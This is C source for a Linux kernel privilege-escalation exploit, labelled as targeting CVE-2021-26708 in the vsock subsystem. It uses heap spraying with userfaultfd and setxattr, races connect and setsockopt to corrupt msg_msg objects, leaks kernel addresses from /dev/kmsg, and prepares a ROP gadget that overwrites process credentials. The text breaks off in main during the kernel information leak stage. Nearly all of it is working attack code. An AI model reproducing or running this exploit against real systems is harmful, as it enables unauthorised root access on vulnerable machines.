#define _GNU_SOURCE

#include <errno.h>
#include <stdio.h>
#include <sched.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/msg.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/vm_sockets.h>
#include <linux/userfaultfd.h>

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 			50
#define PAGE_SIZE					4096
#define PAYLOAD_SZ 					40
#define ARB_READ_SZ_VSOCK_SOCK 		6096
#define ARB_READ_SZ_SKBUFF 			(DATALEN_MSG + 1096)
#define GOOD_MSG_MSG_AMOUNT			6

#define SPRAY_DATA_PAGE1 			((void*)0x444342416000)
#define SPRAY_DATA_PAGE2 			((void*)0x444342426000)
#define SPRAY_THREAD_AMOUNT			127
#define MSGSZ 						128
#define MAX_MSG_COUNT_PER_MSQID		50

// Vanilla Linux 5.10.38
#define SOCK_DEF_WRITE_SPACE		0xffffffff81984940lu
#define MSG_MSG_SZ					48
#define DATALEN_MSG 				(PAGE_SIZE - MSG_MSG_SZ)
#define SK_MEMCG_OFFSET 			664
#define SK_MEMCG_RD_LOCATION		(DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET			840
#define OWNER_CRED_RD_LOCATION		(DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET		688
#define SK_WRITE_SPACE_RD_LOCATION	(DATALEN_MSG + SK_WRITE_SPACE_OFFSET)
#define SVM_PORT_OFFSET 776
#define SVM_PORT_LOCALTION 			(DATALEN_MSG + SVM_PORT_OFFSET)

#define ROP_BUF_SIZE 				2800
#define PORT_START					54249
#define SERVER_AMOUNT 				32

#define SKB_SIZE					4096
#define SKB_SHINFO_OFFSET			3776
#define MY_UINFO_OFFSET				256
#define SKBTX_DEV_ZEROCOPY			(1 << 3)
#define CRED_UID_GID_OFFSET			4

#define SET_ALL_CORES				256
#define OVERWRITE					1
#define DONT_OVERWRITE				0
			
// Fedora Server 33, Linux 5.10.13
// #define ARBITRARY_WRITE_GADGET 0xffffffff81655f34lu
// Vanilla Linux 5.10.38
#define ARBITRARY_WRITE_GADGET 		0xffffffff81650ae4lu

struct list_head {
	void* next;
	void* prev;
};

struct msg_msg {
	struct list_head m_list;
	long m_type;
	size_t m_ts;		/* message text size */
	struct msg_msgseg *next;
	void *security;
	/* the actual message follows immediately */
};

struct skb_shared_info {
	__u8                       __unused;             /*     0     1 */
	__u8                       meta_len;             /*     1     1 */
	__u8                       nr_frags;             /*     2     1 */
	__u8                       tx_flags;             /*     3     1 */
	short unsigned int         gso_size;             /*     4     2 */
	short unsigned int         gso_segs;             /*     6     2 */
	struct sk_buff *           frag_list;            /*     8     8 */
	unsigned long              hwtstamps;            /*    16     8 */ // struct skb_shared_hwtstamps
	unsigned int               gso_type;             /*    24     4 */
	unsigned int               tskey;                /*    28     4 */ // u32
	unsigned int               dataref;              /*    32     4 */ // atomic_t
	void *                     destructor_arg;       /*    40     8 */
	unsigned long              frags[34];            /*    48   272 */ // skb_frag_t                 frags[17];  
};

struct ubuf_info {
	void                       (*callback)(struct ubuf_info *, bool);	 /*     0     8 */
	union {
		struct {
			long unsigned int desc;         							 /*     8     8 */
			void *     ctx;                 							 /*    16     8 */
		};
	};
};


int vsock = -1;
int tfail = 0;
int n_cores = 0;
pthread_barrier_t barrier;

void *xattr_addr1;
void *xattr_addr2;

int good_msqid[GOOD_MSG_MSG_AMOUNT];
int arbitrary_read_msqid;
int corr_msqid;
int msg_count = 0;
int key = 100000;

// UDP sockets
int clientfd;
int serverfd[SERVER_AMOUNT];

char sock_buf[ROP_BUF_SIZE];
struct sockaddr_in sendaddr;
struct sockaddr_in servaddr[SERVER_AMOUNT];
struct sockaddr_in cliaddr[SERVER_AMOUNT];

unsigned long owner_cred = 0;
unsigned long kaslr_offset = 0;
unsigned long sk_buff = 0;

typedef struct {
	int faultfd;
	struct uffd_msg *fmsg;
	void* spray_data;
	void* xattr_addr;
	pthread_barrier_t *spray_done;
	pthread_barrier_t *xattr_barrier;
} xattrarg;

void print_banner()
{
	printf("[+] CVE-2021-26708 exploit\n");

}

int get_n_cores()
{
	cpu_set_t cs;
	CPU_ZERO(&cs);
	sched_getaffinity(0, sizeof(cs), &cs);
	return CPU_COUNT(&cs);
}


void set_process_affinity(int core)
{
	int ret;
	cpu_set_t cs;        
	CPU_ZERO(&cs);  

	if(core == SET_ALL_CORES){
		for(int i=0; i<n_cores; i++){
			CPU_SET(i, &cs);
		}
	}else{
		CPU_SET(core, &cs);
	}

	ret = sched_setaffinity(0, sizeof(cpu_set_t), &cs); 
	if(ret != 0){
		err_exit("[-] set_process_affinity");
	}
}

void initialize_udp_sockets()
{
	// Initialize servers
	int ret = -1;
	memset(sock_buf, 0x42, ROP_BUF_SIZE);
	memset(&servaddr, 0, sizeof(servaddr));

    for(int i=0; i<SERVER_AMOUNT; i++){
    	serverfd[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if(serverfd[i] < 0){
			err_exit("[-] client socket");
		}
		servaddr[i].sin_family = AF_INET; // IPv4
    	servaddr[i].sin_addr.s_addr = INADDR_ANY;
    	servaddr[i].sin_port = htons(PORT_START + i);

		ret = bind(serverfd[i], (const struct sockaddr *)&servaddr[i], sizeof(servaddr[i]));
		if(ret < 0){
			err_exit("[-] socket bind");
		}
    }

	clientfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if(clientfd < 0){
		err_exit("[-] client socket");
	}
}

void initialize_userfaultfd(int *xattr_faultfd, struct uffdio_api *xattr_ufapi, struct uffdio_register *xattr_ufreg,
		 struct uffd_msg *xattr_fmsg, struct uffdio_zeropage *xattr_go, void *spray_data){

	*xattr_faultfd = (int) syscall(323, 0);
	if (*xattr_faultfd < 0)
		err_exit("[-] faultfd");

	xattr_ufapi->api = UFFD_API;
	xattr_ufapi->features = 0;

	if (ioctl(*xattr_faultfd, UFFDIO_API, xattr_ufapi) == -1) {
		err_exit("[-] xattr ioctl UFFDIO_API");
	}


	xattr_ufreg->range.start = (uint64_t)(spray_data + PAGE_SIZE*4);
	xattr_ufreg->range.len = PAGE_SIZE;
	xattr_ufreg->mode = UFFDIO_REGISTER_MODE_MISSING;

	if (ioctl(*xattr_faultfd, UFFDIO_REGISTER, xattr_ufreg)) {
		err_exit("[-] xattr ioctl UFFDIO_REGISTER");
	}
}

void set_fault_as_handled_userfaultd(int xattr_faultfd, pthread_t xtid, pthread_t* x_th, struct uffdio_zeropage *xattr_go, void *spray_data)
{
	int ret = -1;
	// specify setxattr fault as handled
	xattr_go->range.start = (uint64_t)(spray_data + PAGE_SIZE*4);
	xattr_go->range.len = PAGE_SIZE;
	xattr_go->mode = 0;

	if (ioctl(xattr_faultfd, UFFDIO_ZEROPAGE, xattr_go)) {
		err_exit("[-] xattr ioctl UFFDIO_ZEROPAGE");
	}
	if (xattr_go->zeropage < 0) {
		err_exit("[-] xattr zeropage");
	}
	else if (xattr_go->zeropage != PAGE_SIZE) {
		err_exit("[-] Unknown amount zeroed");
	}

	close(xattr_faultfd);

	ret = pthread_join(xtid, NULL);
	if (ret != 0)
		err_exit("[-] xattr pthread_join #");


	for(int i=0; i<SPRAY_THREAD_AMOUNT; i++){
		ret = pthread_join(x_th[i], NULL);
		if (ret != 0)
			err_exit("[-] xattr pthread_join #");
	}
}

void spray_sk_buff()
{
	int ret = -1;
	int cores = get_n_cores();
	sendaddr.sin_family = AF_INET;
    sendaddr.sin_addr.s_addr = INADDR_ANY;
	for(int j=0; j<cores; j++){
    	set_process_affinity(j);
    	for(int i=0; i<SERVER_AMOUNT; i++){
	    	// send buffer to each server
	    	sendaddr.sin_port = htons(PORT_START + i);
	    	ret = sendto(clientfd, sock_buf, ROP_BUF_SIZE, MSG_DONTWAIT, (const struct sockaddr *) &sendaddr, sizeof(sendaddr));
	    	if(ret != ROP_BUF_SIZE){
	    		err_exit("[-] sendto");
	    	}
    	}
    }

	set_process_affinity(SET_ALL_CORES);

}

void *th_userfault_xattr(void *arg)
{
	xattrarg* xarg = (xattrarg*)arg;
	int faultfd = xarg->faultfd;
	struct uffd_msg *fmsg = xarg->fmsg;
	void *spray_data = xarg->spray_data;
	pthread_barrier_t *spray_done = xarg->spray_done;
	int nread;
	int ret;
	

	for(int i=0; i<SPRAY_THREAD_AMOUNT; i++){
		nread = read(faultfd, fmsg, sizeof(*fmsg));

		if (nread < 0) {
			err_exit("[-] userfault read");
		} else if (nread == 0) {
			err_exit("[-] userfault EOF");
		}

		if (fmsg->event != UFFD_EVENT_PAGEFAULT) {
			err_exit("[-] userfault unexpected event");
		}

		if ((fmsg->arg.pagefault.address < (uint64_t)spray_data+PAGE_SIZE*4) || (fmsg->arg.pagefault.address >= (uint64_t)(spray_data+PAGE_SIZE*5))) {
			err_exit("[-] userfault unexpected fault address");
		}
	}

	ret = pthread_barrier_wait(spray_done);
    if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		err_exit("[-] userfault pthread_barrier_wait");
	}

	// Don't handle pagefault! this way xattr created spray is kept.

	return NULL;
}

void prepare_payload_msg_msg(void *spray_data, unsigned long kaddr, unsigned long size)
{
	void* ret;
	xattr_addr1 = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;
	struct msg_msg *msg_ptr;

	//Don't touch the second part to avoid breaking page fault delivery 
    ret = memset(spray_data, 0xa5, PAGE_SIZE * 4);
    if(ret < 0){
    	err_exit("[-] memset");
    }

	msg_ptr = (struct msg_msg *)xattr_addr1;
    msg_ptr->m_type = 0x1337;
    msg_ptr->m_ts = size;
    msg_ptr->next = (struct msg_msgseg *) kaddr;
}


void prepare_payload_sk_buff(void *spray_data)
{
    struct skb_shared_info *info = NULL;
    struct ubuf_info *uinfo_p = NULL;

    xattr_addr2 = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;


    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

     /*
     *  ROP gadget for arbitrary write:
     *  mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     *  Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p = (struct ubuf_info *)(xattr_addr2 + MY_UINFO_OFFSET);
    uinfo_p->callback = (void *)(ARBITRARY_WRITE_GADGET + kaslr_offset);
    uinfo_p->desc = owner_cred + CRED_UID_GID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p->desc = uinfo_p->desc - 1; /* rsi value 1 should not get into euid */
    
    info = (struct skb_shared_info *)(xattr_addr2 + SKB_SHINFO_OFFSET);
    info->tx_flags = SKBTX_DEV_ZEROCOPY;
    info->destructor_arg = (void *)(sk_buff + MY_UINFO_OFFSET);


}


void *th_xattr_heap_spraying1(void *arg)
{
	
	xattrarg* xarg = (xattrarg*)arg;
	pthread_barrier_t *xattr_barrier = xarg->xattr_barrier;
    size_t size = PAYLOAD_SZ + 1;

    int ret = pthread_barrier_wait(xattr_barrier);
    if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		err_exit("[-] xattr pthread_barrier_wait");
	}
	void *addr = (void *)xattr_addr1;
	// Execution blocked here until userfault is handled
	ret = setxattr("./", "user.exp", addr, size, 0);
	if(ret < 0){
		err_exit("[-] xattr syscall");
	}
	return NULL;
}


void *th_xattr_heap_spraying2(void *arg)
{
	xattrarg* xarg = (xattrarg*)arg;
	pthread_barrier_t *xattr_barrier = xarg->xattr_barrier;
	// Target slab cache size
    size_t size = SKB_SIZE;

    int ret = pthread_barrier_wait(xattr_barrier);
    if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		err_exit("[-] xattr pthread_barrier_wait");
	}
	void *addr = (void *)xattr_addr2;
	// Execution blocked here until userfault is handled
	ret = setxattr("./", "user.exp", addr, size, 0);
	if(ret < 0){
		err_exit("[-] xattr syscall");
	}

	return NULL;
}


int send_msg(char *msg_val, int *msqid){
	int result;
	size_t buf_length;
	struct msgbuf msgb;

    int msgflg = IPC_CREAT | 0666;

    int id = msgget(IPC_PRIVATE, msgflg);
    if(id < 0){
    	err_exit("[-] msgget");
    }

	msgb.mtype = 1;
	strcpy(msgb.mtext, msg_val);
	buf_length = strlen(msgb.mtext) + 1;
	result = msgsnd(id, &msgb, buf_length, IPC_NOWAIT);
	if(result < 0){
		if(errno == EACCES){
			printf("[+] arbitrary free successful\n" );
		}else{
			err_exit("[-] msgsnd send_msg");
		}
	}
	*msqid = id;

	return result;

}

int send_msg_key(char *msg_val, int key, int *msqid){
	int result;
	size_t buf_length;
	struct msgbuf msgb;

    int msgflg = IPC_CREAT | 0666;

    key_t m_key = key;

    int id = msgget(m_key, msgflg);
    if(id < 0){
    	err_exit("[-] msgget");
    }

	msgb.mtype = 1;
	strcpy(msgb.mtext, msg_val);
	buf_length = strlen(msgb.mtext) + 1;
	result = msgsnd(id, &msgb, buf_length, IPC_NOWAIT);
	if(result < 0){
		if(errno == EACCES){
			printf("[+] arbitrary free successful\n" );
		}else if(errno == EAGAIN){

		}else{
			err_exit("[-] msgsnd send_msg_key");
		}
	}
	*msqid = id;

	return result;
}

int send_msg_msqid(char *msg_val, int msqid){
	int result;
	size_t buf_length;
	struct msgbuf msgb;

	msgb.mtype = 1;
	strcpy(msgb.mtext, msg_val);
	buf_length = strlen(msgb.mtext) + 1;
	result = msgsnd(msqid, &msgb, buf_length, IPC_NOWAIT);
	if(result < 0){
		if(errno == EACCES){
			printf("[+] arbitrary free successful\n" );
		}else{
			err_exit("[-] msgsnd send_msg_msqid");
		}
	}

	return result;
}

typedef struct {
	FILE *fp;
	char *rbx;
	char *rcx;
} parsearg;

void *th_parse_kmsg(void* arg)
{
	parsearg* parg = (parsearg*)arg;
	FILE *fp = parg->fp;
	char *rbx = parg->rbx;
	char *rcx = parg->rcx;
	size_t len = 0;
	ssize_t readl;
	char *pch = NULL;
	int found = 0;
	char *rbx_string = "RBX";
	char *line = NULL;
	while(((readl = getline(&line, &len, fp)) != 0) && found == 0){
		pch = strstr(line, rbx_string);
		if(pch){
			strncpy(rbx, pch+5, 16);
			strncpy(rcx, pch+27, 16);
			rbx[16] = '\0';
			rcx[16] = '\0';

			char rbx_null[17];
			strcpy(rbx_null, "0000000000000000");
			if(strncmp(rbx, rbx_null, 16) != 0){
				found++;
			}
		}
	}
	return NULL;
}


int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&barrier);
	if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec < lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

typedef struct {
	long lag_nsec;
	int result_msqid;
	int result_msgsnd;
	int overwrite_flag;
} connecterarg;

void *th_connect(void *arg)
{
	connecterarg* carg = (connecterarg*)arg;
	int ret = -1;
	int msqid;
	long lag_nsec = carg->lag_nsec * 1000;
	struct timespec tp0;
	struct timespec tp;

	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
		.svm_port = 0x69dead69,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&addr, sizeof(struct sockaddr_vm));

	if(carg->overwrite_flag==DONT_OVERWRITE){
		clock_gettime(CLOCK_MONOTONIC, &tp0);
		clock_gettime(CLOCK_MONOTONIC, &tp);

		while(tp0.tv_nsec + 35*1000 > tp.tv_nsec){
			clock_gettime(CLOCK_MONOTONIC, &tp);
		}

		int msqid;
		
		ret = send_msg("GGGGGGGGGGGGGGG", &msqid);
		carg->result_msqid=msqid;
	}else{
		ret = send_msg_key("CCCCCCCCCCCCCCC", key, &msqid);
		msg_count++;
		if(msg_count==MAX_MSG_COUNT_PER_MSQID){
			key++;
			msg_count=0;
		}
		if (ret == -1){
			key++;
		}

		carg->result_msqid=msqid;
		carg->result_msgsnd=ret;
	}

	return NULL;
}


typedef struct {
	long lag_nsec;
	int overwrite_flag;
	unsigned long write_val;
} writerarg;

void *th_setsockopt(void *arg)
{
	writerarg* warg = (writerarg*)arg;
	int ret = -1;
	long lag_nsec = warg->lag_nsec * 1000;
	struct timespec tp;
	unsigned long size = 0;
	unsigned long val;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &tp);
	size = tp.tv_nsec;

	if(warg->overwrite_flag == OVERWRITE){
		val = warg->write_val;
	}else{
		val = size;
	}

	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&val, sizeof(unsigned long));

	return NULL;
}

unsigned long hex_string_to_ul(char *string){
	unsigned long result = 0;
	unsigned long tmp;
	for(int i=0; i<16; i++){
		char c = string[i];

		switch(c){
			case '0': tmp=0x0; break;
			case '1': tmp=0x1; break;
			case '2': tmp=0x2; break;
			case '3': tmp=0x3; break;
			case '4': tmp=0x4; break;
			case '5': tmp=0x5; break;
			case '6': tmp=0x6; break;
			case '7': tmp=0x7; break;
			case '8': tmp=0x8; break;
			case '9': tmp=0x9; break;
			case 'a': tmp=0xa; break;
			case 'b': tmp=0xb; break;
			case 'c': tmp=0xc; break;
			case 'd': tmp=0xd; break;
			case 'e': tmp=0xe; break;
			case 'f': tmp=0xf; break;
		}
		tmp = tmp << (15-i)*4;
		result |= tmp;
	}

	return result;
}


int main(int argc, char** argv)
{
	int i;
	int ret = -1;
	long loop = 0;
	unsigned long size = 0;
	
	pthread_t th[6] = { 0 };
	pthread_t x_th1[SPRAY_THREAD_AMOUNT] = { 0 };
	pthread_t x_th2[SPRAY_THREAD_AMOUNT] = { 0 };
	pthread_t xtid1;
	pthread_t xtid2;
	pthread_barrier_t spray_done[2];

	FILE *fp; 
	
	n_cores = get_n_cores();

	// disable stdout buffering
	setvbuf(stdout, NULL, _IONBF, 0); 

	print_banner();

	uid_t uid = getuid();
    gid_t gid = getgid();

    printf("[ ] uid=%d gid=%d\n", uid, gid);

    initialize_udp_sockets();

    spray_sk_buff();

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE, &size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE, &size, sizeof(unsigned long));



	spray_sk_buff();

	char rbx_good[17];
	char rcx_good[GOOD_MSG_MSG_AMOUNT][17];

	char rbx_corr[17];
	char rcx_corr[17];

	unsigned long good_msg_addr[4];

	parsearg parg;
	writerarg warg;
	connecterarg carg;
	xattrarg xarg[2];

	int xattr_faultfd[2] = { -1 };
	struct uffdio_api xattr_ufapi[2];
	struct uffdio_register xattr_ufreg[2];
	struct uffd_msg xattr_fmsg[2];
	struct uffdio_zeropage xattr_go[2];


	///////////////////////////////////////////////////////////USERFAULTFD XATTR MSG_MSG//////////////////////////////////////
	void *spray_data1 = mmap(SPRAY_DATA_PAGE1, PAGE_SIZE*5, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (spray_data1 == MAP_FAILED) {
		err_exit("[-] xattr mmap");
	}
	
	initialize_userfaultfd(&xattr_faultfd[0], &xattr_ufapi[0], &xattr_ufreg[0], &xattr_fmsg[0], &xattr_go[0], spray_data1);

	ret = pthread_barrier_init(&spray_done[0], NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	xarg[0].faultfd = xattr_faultfd[0];
	xarg[0].fmsg = &xattr_fmsg[0];
	xarg[0].spray_data = spray_data1;
	xarg[0].spray_done = &spray_done[0];


	if (pthread_create(&xtid1, NULL, th_userfault_xattr, (void*)&xarg[0])) {
		err_exit("[-] userfault_xattr pthread_create");
	}



	////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	///////////////////////////////////////////////////////////USERFAULTFD skbuff //////////////////////////////////////////////////


	void *spray_data2 = mmap(SPRAY_DATA_PAGE2, PAGE_SIZE*5, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (spray_data2 == MAP_FAILED) {
		err_exit("[-] xattr mmap");
	}
	
	initialize_userfaultfd(&xattr_faultfd[1], &xattr_ufapi[1], &xattr_ufreg[1], &xattr_fmsg[1], &xattr_go[1], spray_data2);

	ret = pthread_barrier_init(&spray_done[1], NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	xarg[1].faultfd = xattr_faultfd[1];
	xarg[1].fmsg = &xattr_fmsg[1];
	xarg[1].spray_data = spray_data2;
	xarg[1].spray_done = &spray_done[1];


	if (pthread_create(&xtid2, NULL, th_userfault_xattr, (void*)&xarg[1])) {
		err_exit("[-] userfault_xattr pthread_create");
	}

	printf("[+] thread for xattr userfault 2 handling created\n");


	////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	pthread_barrier_t xattr_barrier1;
	ret = pthread_barrier_init(&xattr_barrier1, NULL, SPRAY_THREAD_AMOUNT+1);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	pthread_barrier_t xattr_barrier2;
	ret = pthread_barrier_init(&xattr_barrier2, NULL, SPRAY_THREAD_AMOUNT+1);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	xarg[0].xattr_barrier = &xattr_barrier1;
	for(i=0; i<SPRAY_THREAD_AMOUNT; i++){
		ret = pthread_create(&x_th1[i], NULL, th_xattr_heap_spraying1, &xarg[0]);
		if (ret != 0)
			err_exit("[-] pthread_create #0");
	}

	xarg[1].xattr_barrier = &xattr_barrier2;
	for(i=0; i<SPRAY_THREAD_AMOUNT; i++){
		ret = pthread_create(&x_th2[i], NULL, th_xattr_heap_spraying2, &xarg[1]);
		if (ret != 0)
			err_exit("[-] pthread_create #0");
	}

	fp = fopen("/dev/kmsg", "r");
	if (fp == NULL)
		err_exit("[-] open /dev/kmsg");


	ret = pthread_barrier_init(&barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	int aurkitu = 0;
	printf("[ ] stage 1: collect good msg_msg addresses\n");
	printf("[ ] racing...\n");

	for(i=0; i<GOOD_MSG_MSG_AMOUNT; i++){
		aurkitu = 0;
		parg.fp = fp;
		parg.rbx = rbx_good;
		parg.rcx = rcx_good[i];
		while(aurkitu == 0) {
		fseek(fp, 0, SEEK_END);
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		carg.lag_nsec = tmo1;
		carg.overwrite_flag = DONT_OVERWRITE;
		warg.lag_nsec = tmo2;
		warg.overwrite_flag = DONT_OVERWRITE; // Do not overwrite with given value

		ret = pthread_create(&th[0], NULL, th_connect, &carg);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&th[1], NULL, th_setsockopt, &warg);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles");
			exit(EXIT_FAILURE);
		}


		ret = pthread_create(&th[2], NULL, th_parse_kmsg, &parg);
		if (ret != 0)
			err_exit("[-] pthread_create #1");


		// Time to parse /dev/kmsg
		usleep( 5 * 1000);
		pthread_cancel(th[2]);

		ret = pthread_join(th[2], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #2");

		if(strncmp(rcx_good[i], "ff", 2) == 0){
			printf("[+] good msg_msg: 0x%s msq=%d\n", rcx_good[i], carg.result_msqid);
			good_msqid[i] = carg.result_msqid;
			for(int k=0; k<100; k++){
				send_msg_msqid("GGGGGGGGGGGGGGG", carg.result_msqid);
			}

			aurkitu++;
		}
		loop++;

		}
	}
	printf("[+] vsock_sock 0x%s\n", rbx_good);
	fclose(fp);

	spray_sk_buff();

	fp = fopen("/dev/kmsg", "r");
	if (fp == NULL)
		err_exit("[-] open /dev/kmsg");

	char rcx_good_lsb [9];
	memcpy(rcx_good_lsb, &rcx_good[0][8], 8);
	char *ptr;

	good_msg_addr[0] = strtol(rcx_good_lsb, &ptr, 16);

	memcpy(rcx_good_lsb, &rcx_good[1][8], 8);
	good_msg_addr[1] = strtol(rcx_good_lsb, &ptr, 16);

	memcpy(rcx_good_lsb, &rcx_good[2][8], 8);
	good_msg_addr[2] = strtol(rcx_good_lsb, &ptr, 16);

	memcpy(rcx_good_lsb, &rcx_good[3][8], 8);
	good_msg_addr[3] = strtol(rcx_good_lsb, &ptr, 16);


	unsigned long kaddr =  hex_string_to_ul(rbx_good);
	prepare_payload_msg_msg(spray_data1, kaddr, ARB_READ_SZ_VSOCK_SOCK);

	printf("[ ] stage 2: replace good msg_msg with handcrafted msg_msg\n");
	printf("[ ] looping for overwriting ...\n");
	aurkitu = 0;
	loop = 0;


	parg.fp = fp;
	parg.rbx = rbx_corr;
	parg.rcx = rcx_corr;

	while(aurkitu == 0) {
		if(loop % 2 == 0){
			warg.write_val = good_msg_addr[0];
			arbitrary_read_msqid = good_msqid[0];
		}else{
			warg.write_val = good_msg_addr[1];
			arbitrary_read_msqid = good_msqid[1];
		}

		fseek(fp, 0, SEEK_END);
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		carg.lag_nsec = tmo1;	
		carg.overwrite_flag = OVERWRITE;
		warg.lag_nsec = tmo2;
		warg.overwrite_flag = OVERWRITE; // Overwrite with given value

		ret = pthread_create(&th[0], NULL, th_connect, &carg);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&th[1], NULL, th_setsockopt, &warg);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles");
			exit(EXIT_FAILURE);
		}


		if(carg.result_msgsnd == -1){

			// Start xattr+usefaultfd spraying
			ret = pthread_barrier_wait(&xattr_barrier1);
		    if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
				perror("[-] xattr pthread_barrier_wait");
				return EXIT_FAILURE;
			}
			printf("[ ] spraying...\n");		

			ret = pthread_create(&th[2], NULL, th_parse_kmsg, &parg);
			if (ret != 0)
				err_exit("[-] pthread_create #1");

			// Time to parse /dev/kmsg
			usleep( 50 * 1000);
			pthread_cancel(th[2]);
			ret = pthread_join(th[2], NULL);
			if (ret != 0)
				err_exit("[-] pthread_join #2");

			if(strncmp(rcx_corr, "ff", 2) == 0){
				//printf("[+] corr msg_msg: 0x%s msq=%d\n", rcx_corr, carg.result_msqid);
				corr_msqid = carg.result_msqid;
				for(int k=0; k<100; k++){
					send_msg_msqid("GGGGGGGGGGGGGGG", carg.result_msqid);
				}
				aurkitu++;
			}else{
				strcpy(rcx_corr, "0000000000000000");
			}
			aurkitu++;
		}
		loop++;

	}




	printf("[+] succesfully overwritten msg_msg\n");


	printf("[ ] waiting for userfault...\n");
	

	ret = pthread_barrier_wait(&spray_done[0]);
    if (ret != 0 && ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] xattr pthread_barrier_wait");
		return EXIT_FAILURE;
	}


	typedef struct msgbuf {
		long mtype;
		unsigned long mtext[ARB_READ_SZ_SKBUFF];
	} message_buf;


	message_buf kmem1;


	unsigned long port = 0;
	unsigned long sk_memcg = 0;
	owner_cred = 0;
	unsigned long sock_def_write_space = 0;
	kaslr_offset = 0;

	aurkitu = 0;

	ret = msgrcv(arbitrary_read_msqid, &kmem1, ARB_READ_SZ_VSOCK_SOCK, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
	if(ret < 0){
		err_exit("[-] receive_msg");
	}
	if(ret == ARB_READ_SZ_VSOCK_SOCK){
		printf("[+] kernel information leak successful!\n");
		port = (kmem1.mtext[SVM_PORT_LOCALTION / sizeof(unsigned long)] & 0xffffffff00000000) >> 32;
		printf("\tsvm_port 0x%lx (offset %ld in the leaked kmem)\n",
				port, SVM_PORT_LOCALTION);

		sk_memcg = kmem1.mtext[(SK_MEMCG_RD_LOCATION / sizeof(unsigned long)) - 1];
	    printf("\tsk_memcg 0x%lx (offset %ld in the leaked kmem)\n",
				sk_memcg, SK_MEMCG_RD_LOCATION);

	    owner_cred = kmem1.mtext[(OWNER_CRED_RD_LOCATION/ sizeof(unsigned long)) - 1];
	    printf("\towner cred 0x%lx (offset %ld in the leaked kmem)\n",
				owner_cred, OWNER_CRED_RD_LOCATION);

